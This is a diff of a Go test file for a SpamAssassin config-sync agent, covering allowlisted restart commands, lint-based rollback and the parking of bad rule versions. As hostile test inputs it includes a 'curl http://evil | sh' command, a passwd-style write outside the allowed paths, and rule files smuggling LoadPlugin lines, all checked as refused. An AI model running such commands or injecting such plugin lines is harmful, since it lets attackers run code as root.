@@ -4,10 +4,17 @@ import (
 	"context"
 	"crypto/sha1"
 	"encoding/hex"
+	"encoding/json"
+	"errors"
+	"net/http"
+	"net/http/httptest"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strings"
+	"sync/atomic"
 	"testing"
+	"time"
 )
 
 func sha1hex(s string) string {
@@ -16,13 +23,13 @@ func sha1hex(s string) string {
 }
 
 // syncFixture points the SpamAssassin dir and binary at a temp tree and
-// records every command the apply step runs. lint returns the --lint output
-// for the n-th lint call (0-based).
+// records every command the apply step runs. lint(n) answers the n-th lint
+// call (0-based) with its output and error; nil lint means a clean lint.
 type syncFixture struct {
 	root, saDir, other string
 	cmds               [][]string
 	lintCalls          int
-	lint               func(n int) string
+	lint               func(n int) (string, error)
 }
 
 func newSyncFixture(t *testing.T) *syncFixture {
@@ -40,7 +47,8 @@ func newSyncFixture(t *testing.T) *syncFixture {
 			n := f.lintCalls
 			f.lintCalls++
 			if f.lint != nil {
-				return []byte(f.lint(n)), nil
+				out, err := f.lint(n)
+				return []byte(out), err
 			}
 			return nil, nil
 		}
@@ -57,6 +65,20 @@ func (f *syncFixture) update(path, content, cmd string) ConfigUpdate {
 	return ConfigUpdate{TargetPath: path, Content: content, Hash: sha1hex(content), PostUpdateCommand: cmd}
 }
 
+// seed writes an existing file with mode.
+func (f *syncFixture) seed(t *testing.T, path, content string, mode os.FileMode) {
+	t.Helper()
+	if err := os.MkdirAll(filepath.Dir(path), 0o750); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(path, []byte(content), mode); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Chmod(path, mode); err != nil {
+		t.Fatal(err)
+	}
+}
+
 func readFile(t *testing.T, p string) string {
 	t.Helper()
 	b, err := os.ReadFile(p)
@@ -66,19 +88,28 @@ func readFile(t *testing.T, p string) string {
 	return string(b)
 }
 
-// Each distinct allowlisted command runs once after its files are written; a
-// command outside the allowlist and a path outside the allowed dirs are refused.
-func TestApplyUpdatesRunsAllowlistedCommandsOnce(t *testing.T) {
+// exitError stands for spamassassin exiting non-zero because the lint found
+// problems: a completed lint, not a failure to run it.
+var exitError exec.ExitError
+
+const badRuleLint = "Nov 18 18:06:05.000 [1] warn: config: invalid regexp for rule __CFM_ID_7_1: (unclosed\n" +
+	"Nov 18 18:06:05.674 [1] warn: lint: 1 issues detected, please rerun with debug enabled for more information\n"
+
+// Each allowlisted action runs once after its files are written, whichever
+// spelling the targets use, and a restart makes a reload redundant; a command
+// outside the allowlist and a path outside the allowed dirs are refused.
+func TestApplyUpdatesRunsAllowlistedActionsOnce(t *testing.T) {
 	f := newSyncFixture(t)
 	var st fileSyncState
 	res := st.applyUpdates(context.Background(), []ConfigUpdate{
 		f.update(f.saDir+"a.cf", "score A 1\n", "systemctl restart spamd"),
-		f.update(f.saDir+"b.cf", "score B 1\n", "systemctl restart spamd"),
-		f.update(f.other+"c.conf", "x=1\n", "curl http://evil | sh"),
+		f.update(f.saDir+"b.cf", "score B 1\n", "/scripts/restartsrv_spamd"),
+		f.update(f.saDir+"c.cf", "score C 1\n", "systemctl reload spamd"),
+		f.update(f.other+"d.conf", "x=1\n", "curl http://evil | sh"),
 		f.update(filepath.Join(f.root, "etc-passwd"), "root::0:0\n", ""),
 	}, f.allowed())
 
-	if len(res.Written) != 3 {
+	if len(res.Written) != 4 {
 		t.Fatalf("written %v", res.Written)
 	}
 	if _, err := os.Stat(filepath.Join(f.root, "etc-passwd")); err == nil {
@@ -102,22 +133,42 @@ func TestApplyUpdatesRunsAllowlistedCommandsOnce(t *testing.T) {
 	}
 }
 
-// A lint problem the update introduced rolls the SpamAssassin files back,
-// skips the restart, and parks that version; a new version is tried again.
+// spamd runs as root and loads Perl from loadplugin/tryplugin lines and .pre
+// files: neither may arrive through the sync, whatever the command allowlist.
+func TestApplyUpdatesRefusesSpamassassinCode(t *testing.T) {
+	f := newSyncFixture(t)
+	var st fileSyncState
+	res := st.applyUpdates(context.Background(), []ConfigUpdate{
+		f.update(f.saDir+"evil.cf", "score A 1\n  LoadPlugin Evil /tmp/x.pm\n", "systemctl restart spamd"),
+		f.update(f.saDir+"evil2.cf", "tryplugin Evil /tmp/x.pm\n", "systemctl restart spamd"),
+		f.update(f.saDir+"v999.pre", "score A 1\n", "systemctl restart spamd"),
+		f.update(f.saDir+"x.pm", "1;\n", ""),
+	}, f.allowed())
+	if len(res.Written) != 0 || len(f.cmds) != 0 || f.lintCalls != 0 {
+		t.Fatalf("code reached spamd: %+v cmds=%v lints=%d", res, f.cmds, f.lintCalls)
+	}
+	for _, n := range []string{"evil.cf", "evil2.cf", "v999.pre", "x.pm"} {
+		if _, err := os.Stat(f.saDir + n); err == nil {
+			t.Errorf("%s written", n)
+		}
+	}
+	// a rule that only mentions the word is fine
+	res = st.applyUpdates(context.Background(), []ConfigUpdate{f.update(f.saDir+"ok.cf", "describe X mentions loadplugin in text\n", "")}, f.allowed())
+	if len(res.Written) != 1 {
+		t.Fatalf("a rule describing the word was refused: %+v", res)
+	}
+}
+
+// A lint problem the update introduced rolls the file back (old content and
+// mode), skips the restart, and parks that version; a new version applies.
 func TestApplyUpdatesRollsBackOnNewLintProblem(t *testing.T) {
 	f := newSyncFixture(t)
-	if err := os.MkdirAll(f.saDir, 0o750); err != nil {
-		t.Fatal(err)
-	}
-	if err := os.WriteFile(f.saDir+"rules.cf", []byte("old rules\n"), 0o600); err != nil {
-		t.Fatal(err)
-	}
-	f.lint = func(n int) string {
+	f.seed(t, f.saDir+"rules.cf", "old rules\n", 0o644)
+	f.lint = func(n int) (string, error) {
 		if n == 1 { // the run after the bad write
-			return "Nov 18 18:06:05.000 [1] warn: config: invalid regexp for rule __CFM_ID_7_1: (unclosed\n" +
-				"Nov 18 18:06:05.674 [1] warn: lint: 1 issues detected, please rerun with debug enabled for more information\n"
+			return badRuleLint, &exitError
 		}
-		return ""
+		return "", nil
 	}
 	var st fileSyncState
 	bad := f.update(f.saDir+"rules.cf", "body __CFM_ID_7_1 /(unclosed/\n", "systemctl restart spamd")
@@ -127,14 +178,20 @@ func TestApplyUpdatesRollsBackOnNewLintProblem(t *testing.T) {
 	if got := readFile(t, f.saDir+"rules.cf"); got != "old rules\n" {
 		t.Fatalf("not rolled back: %q", got)
 	}
+	if fi, _ := os.Stat(f.saDir + "rules.cf"); fi.Mode().Perm() != 0o644 {
+		t.Fatalf("rollback changed the mode to %o", fi.Mode().Perm())
+	}
 	if len(res.RolledBack) != 1 || len(f.cmds) != 0 {
 		t.Fatalf("rolled back %v, ran %v", res.RolledBack, f.cmds)
 	}
 	if readFile(t, f.other+"cfm.conf") != "x=1\n" {
 		t.Fatal("a non-SpamAssassin file was rolled back too")
 	}
+	if !st.isParked(f.saDir+"rules.cf", bad.Hash) {
+		t.Fatal("bad version not parked")
+	}
 
-	// the same bad version is not downloaded-and-linted again every tick
+	// the same bad version is not linted again every tick
 	f.lintCalls = 0
 	res = st.applyUpdates(context.Background(), []ConfigUpdate{bad}, f.allowed())
 	if len(res.Written) != 0 || f.lintCalls != 0 {
@@ -148,19 +205,52 @@ func TestApplyUpdatesRollsBackOnNewLintProblem(t *testing.T) {
 	if len(res.Written) != 1 || len(f.cmds) != 1 || readFile(t, f.saDir+"rules.cf") != fixed.Content {
 		t.Fatalf("fixed version not applied: %+v %v", res, f.cmds)
 	}
-	if _, ok := st.parked[f.saDir+"rules.cf"]; ok {
+	if st.isParked(f.saDir+"rules.cf", bad.Hash) {
 		t.Fatal("parked entry kept after a good version")
+	}
+}
+
+// When several SpamAssassin files change together and the lint breaks, each
+// is retried alone: the good one is kept (and restarts spamd), only the bad
+// one is parked.
+func TestApplyUpdatesIsolatesTheBadFile(t *testing.T) {
+	f := newSyncFixture(t)
+	f.seed(t, f.saDir+"mailfromfilters.cf", "old filters\n", 0o600)
+	f.seed(t, f.saDir+"keywords.cf", "old keywords\n", 0o600)
+	good := f.update(f.saDir+"mailfromfilters.cf", "new filters\n", "systemctl restart spamd")
+	bad := f.update(f.saDir+"keywords.cf", "body __CFM_ID_7_1 /(unclosed/\n", "systemctl restart spamd")
+	// lint reports the problem whenever the bad content is on disk
+	f.lint = func(int) (string, error) {
+		if b, _ := os.ReadFile(f.saDir + "keywords.cf"); string(b) == bad.Content {
+			return badRuleLint, &exitError
+		}
+		return "", nil
+	}
+	var st fileSyncState
+	res := st.applyUpdates(context.Background(), []ConfigUpdate{good, bad}, f.allowed())
+
+	if readFile(t, f.saDir+"mailfromfilters.cf") != good.Content {
+		t.Fatal("the good file was not kept")
+	}
+	if readFile(t, f.saDir+"keywords.cf") != "old keywords\n" {
+		t.Fatal("the bad file was not rolled back")
+	}
+	if st.isParked(f.saDir+"mailfromfilters.cf", good.Hash) || !st.isParked(f.saDir+"keywords.cf", bad.Hash) {
+		t.Fatalf("parked %v", st.parked)
+	}
+	if len(res.Written) != 1 || len(res.RolledBack) != 1 || len(f.cmds) != 1 {
+		t.Fatalf("%+v cmds=%v", res, f.cmds)
 	}
 }
 
 // A file that did not exist before is removed again on rollback.
 func TestApplyUpdatesRollbackRemovesNewFile(t *testing.T) {
 	f := newSyncFixture(t)
-	f.lint = func(n int) string {
+	f.lint = func(n int) (string, error) {
 		if n == 1 {
-			return "warn: config: failed to parse line, skipping, in \"new.cf\": bogus\n"
+			return "warn: config: failed to parse line, skipping, in \"new.cf\": bogus\n", &exitError
 		}
-		return ""
+		return "", nil
 	}
 	var st fileSyncState
 	st.applyUpdates(context.Background(), []ConfigUpdate{f.update(f.saDir+"new.cf", "bogus\n", "")}, f.allowed())
@@ -169,21 +259,72 @@ func TestApplyUpdatesRollbackRemovesNewFile(t *testing.T) {
 	}
 }
 
-// Problems that were there before the update (rigel's dcc_* lines with the
-// DCC plugin off, titan's missing Hashcash plugin whose eval counter moves when
-// any rule file grows) do not block it.
+// Problems that were there before the update do not block it, even when the
+// update moves them: rigel's dcc_home warning in myip.cf changes "(line 33)"
+// when lines are added above it, and titan's missing Hashcash plugin warning
+// carries Perl eval/DATA counters that move whenever a rule file grows.
 func TestApplyUpdatesIgnoresPreexistingLintProblems(t *testing.T) {
 	f := newSyncFixture(t)
-	f.lint = func(n int) string {
+	f.seed(t, f.saDir+"myip.cf", "dcc_home /var/dcc\n", 0o600)
+	f.lint = func(n int) (string, error) {
+		line := []string{"33", "34"}[n]
 		evalN := []string{"180", "181"}[n]
-		return "Nov 18 18:06:05.000 [270837] warn: config: invalid 'dcc_home' value in /etc/mail/spamassassin/myip.cf (line 33): dcc_home /var/dcc\n" +
+		return "Nov 18 18:06:05.000 [270837] warn: config: invalid 'dcc_home' value in /etc/mail/spamassassin/myip.cf (line " + line + "): dcc_home /var/dcc\n" +
 			"Nov 18 18:06:07.432 [1707296] warn: plugin: failed to parse plugin (from @INC): Can't locate Mail/SpamAssassin/Plugin/Hashcash.pm at (eval " + evalN + ") line 1, <DATA> line 71" + evalN[2:] + ".\n" +
-			"Nov 18 18:06:05.674 [270837] warn: lint: " + []string{"2", "2"}[n] + " issues detected, please rerun with debug enabled for more information\n"
+			"Nov 18 18:06:05.674 [270837] warn: lint: 2 issues detected, please rerun with debug enabled for more information\n", &exitError
 	}
 	var st fileSyncState
-	res := st.applyUpdates(context.Background(), []ConfigUpdate{f.update(f.saDir+"rules.cf", "score X 1\n", "/scripts/restartsrv_spamd")}, f.allowed())
+	res := st.applyUpdates(context.Background(), []ConfigUpdate{f.update(f.saDir+"myip.cf", "score Y 1\ndcc_home /var/dcc\n", "/scripts/restartsrv_spamd")}, f.allowed())
 	if len(res.Written) != 1 || len(res.RolledBack) != 0 || len(f.cmds) != 1 || f.cmds[0][0] != "/scripts/restartsrv_spamd" {
 		t.Fatalf("pre-existing lint problems blocked the update: %+v %v", res, f.cmds)
+	}
+}
+
+// A lint that does not complete is not a result: with no baseline the change
+// waits for the next sync (unwritten); with no after-lint it is rolled back
+// but not parked.
+func TestApplyUpdatesLintFailures(t *testing.T) {
+	f := newSyncFixture(t)
+	f.seed(t, f.saDir+"rules.cf", "old\n", 0o600)
+	u := f.update(f.saDir+"rules.cf", "new\n", "systemctl restart spamd")
+	var st fileSyncState
+
+	f.lint = func(int) (string, error) { return "", errors.New("exec: spamassassin: killed") }
+	res := st.applyUpdates(context.Background(), []ConfigUpdate{u}, f.allowed())
+	if len(res.Deferred) != 1 || readFile(t, f.saDir+"rules.cf") != "old\n" || len(f.cmds) != 0 {
+		t.Fatalf("baseline failure: %+v", res)
+	}
+
+	f.lintCalls = 0
+	f.lint = func(n int) (string, error) {
+		if n == 1 {
+			return "", errors.New("exec: spamassassin: killed")
+		}
+		return "", nil
+	}
+	res = st.applyUpdates(context.Background(), []ConfigUpdate{u}, f.allowed())
+	if len(res.RolledBack) != 1 || readFile(t, f.saDir+"rules.cf") != "old\n" || len(f.cmds) != 0 {
+		t.Fatalf("after-lint failure: %+v", res)
+	}
+	if st.isParked(f.saDir+"rules.cf", u.Hash) {
+		t.Fatal("parked a version that was never judged")
+	}
+}
+
+// A target that exists but cannot be read is left alone: a rollback could not
+// restore it.
+func TestApplyUpdatesSkipsUnreadableTarget(t *testing.T) {
+	f := newSyncFixture(t)
+	if err := os.MkdirAll(f.other+"dir.conf", 0o750); err != nil { // reading a directory fails with EISDIR
+		t.Fatal(err)
+	}
+	var st fileSyncState
+	res := st.applyUpdates(context.Background(), []ConfigUpdate{f.update(f.other+"dir.conf", "x=1\n", "")}, f.allowed())
+	if len(res.Written) != 0 {
+		t.Fatalf("%+v", res)
+	}
+	if fi, err := os.Stat(f.other + "dir.conf"); err != nil || !fi.IsDir() {
+		t.Fatal("the unreadable target was replaced")
 	}
 }
 
@@ -195,5 +336,61 @@ func TestApplyUpdatesWithoutSpamassassinBinary(t *testing.T) {
 	res := st.applyUpdates(context.Background(), []ConfigUpdate{f.update(f.saDir+"rules.cf", "score X 1\n", "systemctl reload spamd")}, f.allowed())
 	if len(res.Written) != 1 || f.lintCalls != 0 || len(f.cmds) != 1 {
 		t.Fatalf("%+v lints=%d cmds=%v", res, f.lintCalls, f.cmds)
+	}
+}
+
+// syncConfigs does not download a parked version again: the hash cfm-web
+// lists for the path is the one that failed the lint.
+func TestSyncConfigsSkipsParkedDownload(t *testing.T) {
+	f := newSyncFixture(t)
+	path := f.saDir + "keywords.cf"
+	bad := f.update(path, "body __CFM_ID_7_1 /(unclosed/\n", "systemctl restart spamd")
+	var getUpdates atomic.Int32
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		switch r.URL.Path {
+		case "/api/agent/list-files":
+			_ = json.NewEncoder(w).Encode(map[string]any{"tracked_files": map[string]string{path: bad.Hash}})
+		case "/api/agent/get-updates":
+			getUpdates.Add(1)
+			_ = json.NewEncoder(w).Encode(map[string]any{"configs": []ConfigUpdate{bad}})
+		default:
+			http.NotFound(w, r)
+		}
+	}))
+	defer srv.Close()
+	r := New(Config{BaseURL: srv.URL, Token: "t", Interval: time.Hour})
+	r.files.parked = map[string]string{path: bad.Hash}
+	r.syncConfigs(context.Background())
+	if n := getUpdates.Load(); n != 0 {
+		t.Fatalf("get-updates called %d times for a parked version", n)
+	}
+}
+
+// startConfigSync never runs two syncs at once: a tick during a slow sync is
+// skipped rather than queued.
+func TestStartConfigSyncDoesNotOverlap(t *testing.T) {
+	release := make(chan struct{})
+	var listCalls atomic.Int32
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		listCalls.Add(1)
+		<-release
+		_ = json.NewEncoder(w).Encode(map[string]any{"tracked_files": map[string]string{}})
+	}))
+	defer srv.Close()
+	r := New(Config{BaseURL: srv.URL, Token: "t", Interval: time.Hour})
+	r.startConfigSync()
+	for i := 0; i < 50 && listCalls.Load() == 0; i++ {
+		time.Sleep(10 * time.Millisecond)
+	}
+	r.startConfigSync() // still running: skipped
+	close(release)
+	for i := 0; i < 100 && r.fileSyncRunning.Load(); i++ {
+		time.Sleep(10 * time.Millisecond)
+	}
+	if n := listCalls.Load(); n != 1 {
+		t.Fatalf("list-files called %d times, want 1", n)
+	}
+	if r.fileSyncRunning.Load() {
+		t.Fatal("sync still marked running")
 	}
 }
